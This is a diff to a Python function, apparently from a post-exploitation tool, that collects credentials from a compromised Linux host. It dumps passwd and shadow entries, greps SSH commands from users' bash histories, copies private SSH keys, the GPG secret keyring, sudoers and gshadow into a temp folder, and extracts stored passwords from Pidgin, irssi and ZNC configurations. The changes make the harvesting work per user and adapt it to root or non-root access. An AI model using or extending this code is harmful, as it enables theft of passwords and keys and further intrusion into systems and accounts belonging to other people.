@@ -8,6 +8,7 @@ def creds():
     print("[+] Collecting user and system credentials....")
     maketemp("credentials")
     os.chdir(Temp_Dir+"/credentials/")
+    users()
     
     os.system('getent passwd > passwd.txt')
     os.system('getent shadow > shadow.txt')
@@ -15,28 +16,39 @@ def creds():
     os.system("last -a > last.txt")
     os.system("getent aliases > mail_aliases.txt")
 
-    
-    os.system("find / -maxdepth 3 -name .ssh > ssh_locations.txt")
-    os.system("ls /home/*/.ssh/* > ssh_contents.txt")   
+    if currentuser == "root":
+        os.system("find / -maxdepth 3 -name .ssh > ssh_locations.txt")
+        for user in userlist:
+            if os.path.exists("/home/%s" % user) is True:
+                os.system("ls /home/%s/.ssh/* > ssh_contents.txt" % user) 
+    else:
+        os.system("ls %s/.ssh/* > ssh_contents.txt" % Home_Dir)
+  
     sshfiles = ["ssh_locations.txt","ssh_contents.txt"]
     combinefiles("SSH_Locations.txt", sshfiles)
-    os.system("rm ssh_locations.txt ssh_contents.txt")
-    if os.path.exists(Home_Dir+"/.bash_history") is True:
-        os.system("cat "+Home_Dir+"/.bash_history | grep ssh > SSH_History.txt")
+    for files in sshfiles:
+        if os.path.exists(files) is True:
+            os.system("rm %s" % files)
 
+    for user in userlist:
+        if os.path.exists("/home/%s/.bash_history" % user) is True:
+            os.system("cat /home/%s/.bash_history | grep ssh > %s-SSH-History.txt" % (user, user))
+        if currentuser == "root":
+            if os.path.exists("%s/.bash_history" % Home_Dir) is True:
+                os.system("cat %s/.bash_history | grep ssh > Root-SSH-History.txt" % Home_Dir)
 
     credentials = [ "/etc/master.passwd", "/etc/sudoers", "/etc/ssh/sshd_config", Home_Dir+"/.ssh/id_dsa", Home_Dir+"/.ssh/id_dsa.pub",
                     Home_Dir+"/.ssh/id_rsa", Home_Dir+"/.ssh/id_rsa.pub", Home_Dir+"/.gnupg/secring.gpg", Home_Dir+"/.ssh/authorized_keys",
                     Home_Dir+"/.ssh/known_hosts", "/etc/gshadow", "/etc/ca-certificates.conf", "/etc/passwd" ]
+
     for x in credentials:
         copy2temp(x, "credentials")
 
 
-	users()
     if whereis('pidgin') is not None:
         for user in userlist:
-            if os.path.exists("/home/"+user+"/.purple/accounts.xml") is True:
-                accts = open("/home/"+user+"/.purple/accounts.xml")
+            if os.path.exists("/home/%s/.purple/accounts.xml" % user) is True:
+                accts = open("/home/%s/.purple/accounts.xml" % user)
                 saved = open("Pidgin.txt", "a")
                 for line in accts.readlines():
                     if '<protocol>' in line:
@@ -52,8 +64,8 @@ def creds():
                 saved.close()
 
     for user in userlist:
-        if os.path.exists("/home/"+user+"/.irssi/config") is True:
-            accts = open("/home/"+user+"/.irssi/config")
+        if os.path.exists("/home/%s/.irssi/config" % user) is True:
+            accts = open("/home/%s/.irssi/config" % user)
             saved = open("irssi.txt", "a")
             for line in accts.readlines():
                 if "password = " in line:
@@ -64,7 +76,10 @@ def creds():
             saved.close()
 
     for user in userlist:
-        copy2temp("/home/"+user+"/.znc/configs/znc.conf")
+        if os.access("/home/%s/.znc/configs/znc.conf" % user, os.R_OK):
+            copy2temp("/home/%s/.znc/configs/znc.conf" % user)
+        else:
+            pass
            
             
 
